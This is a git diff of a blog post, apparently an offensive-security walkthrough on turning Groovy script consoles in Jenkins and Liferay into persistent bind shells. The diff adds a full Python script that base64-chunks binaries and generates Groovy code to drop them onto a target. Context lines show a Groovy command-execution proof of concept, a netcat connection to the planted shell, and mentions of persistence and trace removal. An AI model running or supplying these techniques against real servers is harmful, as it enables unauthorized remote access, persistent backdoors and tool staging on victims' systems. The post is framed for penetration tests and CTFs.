@@ -1,14 +1,15 @@
 ---
-title: "Weaponizing Script Consoles In DevOps Environments: Egress Filtering Bypass with Bind Shell & Transfering Tools"
+title: "DevOops: Script Consoles"
 date: 2025-10-22
-slug: liferay-jenkins-rce
+slug: devops-rce
 tags:
   - bind shell
   - groovy
+  - devops
   - liferay
   - jenkins
   - RCE
-description: "A practical walkthrough of abusing Groovy script consoles in DevOps environments to write persistent java bind shells, with techniques for transferring tools (base64), persistence, and post-exploitation tailored for tight scenarios where outgoing network access is blocked by firewalls."
+description: "A practical walkthrough of abusing Groovy script consoles in DevOps environments to write persistent java bind shells, with techniques for transferring tools (base64) programmatically, persistence, and post-exploitation tailored for tight scenarios where outgoing network access is blocked by firewalls."
 ---
 
 ![Liferay Jenkins exploitation banner](../images/banner33.png)
@@ -19,7 +20,7 @@ Have you ever been in an engagement or CTF where you finally find a Groovy scrip
 
 Over the next few minutes I'll show a practical, repeatable approach for turning a Groovy console into a persistent, multithreaded java bind shell that lives in the webroot and how to transfer binary tools via base64 encoding (small and large size). This guide serves as a proof of concept; the shell in here is not secure enough for opsec, but it's a starting point for you to build upon.
 
-## <!-- more -->
+## `<!-- more -->`
 
 ### Quick Refresher on Bind Shells:
 
@@ -48,8 +49,6 @@ When your RCE is limited to a Groovy-style script console (in tools such as Jenk
 5. Verify and connect: Test the bind shell and establish a connection.
 6. Clean up: Document detection artifacts and remove traces when done.
 
----
-
 ## Step 1: Initial Reconnaissance
 
 ### Simple OS Commands POC
@@ -77,15 +76,15 @@ proc.waitForOrKill(1000)
 println "out> $sout err> $serr"
 ```
 
----
-
 ## Step 2: Finding Stable, Writable Locations
 
 From the console, run simple listing commands to map the file system and locate likely writable paths.
 
 Typical candidate locations:
 
-- Application webroot (e.g., `<TOMCAT_HOME>/webapps/ROOT`) — files here can often be triggered by HTTP requests.
+- Application webroot (e.g., `<TOMCAT_HOME>/webapps/ROOT`)
+
+files here can often be triggered by HTTP requests.
 
 Tips:
 
@@ -99,7 +98,7 @@ Tips:
 In this step, you use a Groovy script that embeds a Java-based bind shell.
 
 Use this link to access the script:
-[https://raw.githubusercontent.com/vipa0z/groovy-rce-bindshell/refs/heads/main/persistent_bind_shell.groovy](https://raw.githubusercontent.com/vipa0z/groovy-rce-bindshell/refs/heads/main/persistent_bind_shell.groovy)
+[https://github.com/vipa0z/groovy-rce-bindshell](https://github.com/vipa0z/groovy-rce-bindshell)
 
 The script performs two main steps:
 
@@ -122,16 +121,12 @@ rlwrap -cAr nc -nv 172.16.30.10 3001
 
 **Note on why multithreading was used:** With many bind shells, it’s easy to accidentally kill the session (for example, by hitting `Ctrl+C`). In early versions of this shell, once the client disconnected, reconnecting with netcat wasn’t reliable. To fix that, the java handler accepts new connections in separate threads so a disconnect doesn’t permanently “break” the listener.
 
----
-
 ## Script Console as a dropper
 
 We can use the script console for dropping tools on the file system by first base64-encoding them and then running a script to decode that data into a local file on the target.
 Depending on the target environment, some console versions only support string variables that are around 6000 characters in length, which requires a bit of improvisation on our side.
 
 ### Method 1: Dropping smaller sized tools (e.g., netcat, potato exploits, etc.)
-
-**Note:** This will not work if your base64 string is more than 6000 characters in length; you can use Method 2 below instead.
 
 Base64 encode the tool and copy to clipboard:
 
@@ -154,13 +149,93 @@ Files.write(dest, bytes)
 println "Wrote ${bytes.length} bytes to ${dest}"
 ```
 
+**Note:** This will not work if your base64 string is more than 6000 characters in length; you can use Method 2 below instead.
+
 ### Dropping Larger Binaries
 
-update: i wrote a dropper generator that generates the groovy script to drop the tool for you, you can use either the dropper here: https://github.com/vipa0z/B64Dropper or continue with the semi-manual method below.
+Update: I wrote a dropper generator that creates script console code to drop tools, you can find it here: https://github.com/vipa0z/B64Dropper
+
+example:
+generating dropper code for netcat:
+![generating groovy script with bas64 chunks of netcat](../images/dropper.gif)
+
+If you want to continue with the semi-manual method below:
 
 the following is a script that chunks your tools into smaller base64 files, each containing a base64 String variable that is 6000 characters in length, so you can paste them into the console and reassemble them with Groovy.
 
-Script:TODO
+```python
+#!/usr/bin/env python3
+import os
+import base64
+import argparse
+from pathlib import Path
+
+def chunk_base64_file(input_file, output_dir, chunk_size):
+    """Convert a binary file to base64 and split it into chunks."""
+    with open(input_file, "rb") as f:
+        b64_data = base64.b64encode(f.read()).decode()
+
+    os.makedirs(output_dir, exist_ok=True)
+
+    parts = []
+    for i in range(0, len(b64_data), chunk_size):
+        chunk = b64_data[i:i + chunk_size]
+        part_name = f"part{i // chunk_size + 1}.txt"
+        part_path = Path(output_dir) / part_name
+        with open(part_path, "w") as out:
+            out.write(chunk)
+        parts.append(part_name)
+
+    return parts, len(b64_data)
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="Convert a binary file to base64 and split it into chunk files."
+    )
+    parser.add_argument("input_file", help="Path to the input binary file (e.g., tool.exe)")
+    parser.add_argument("-o", "--output-dir", default="output_chunks", help="Output directory for chunks")
+    parser.add_argument(
+        "-s", "--chunk-size",
+        type=int,
+        default=50000,
+        help="Length of each chunk string (default: 50000)"
+    )
+    args = parser.parse_args()
+
+    parts, total_length = chunk_base64_file(args.input_file, args.output_dir, args.chunk_size)
+
+    abs_dir = os.path.abspath(args.output_dir)
+    print(f"[+] chunks generated, saved in: {abs_dir}\n")
+    print("[+] use the following command to copy all chunks to clipboard:")
+    print(f"cat {args.output_dir}/* | xclip -selection clipboard -i\n")
+    print("[+] paste the contents of your clipboard into the script console, then add this and edit the path:\n")
+
+    joined_parts = ", ".join(parts)
+    java_snippet = f"""import java.util.Base64;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.nio.charset.StandardCharsets;
+
+def allParts = [
+    {joined_parts}
+].join('');
+
+println "Total base64 length: ${{allParts.length()}}";
+
+def dest = Paths.get("C:/Users/<username>/Desktop/file.exe");
+byte[] bytes = Base64.getDecoder().decode(allParts);
+Files.write(dest, bytes);
+println "Wrote ${{bytes.length}} bytes to ${{dest}}";
+"""
+
+    print(java_snippet)
+
+
+if __name__ == "__main__":
+    main()
+
+```
 
 Run:
 
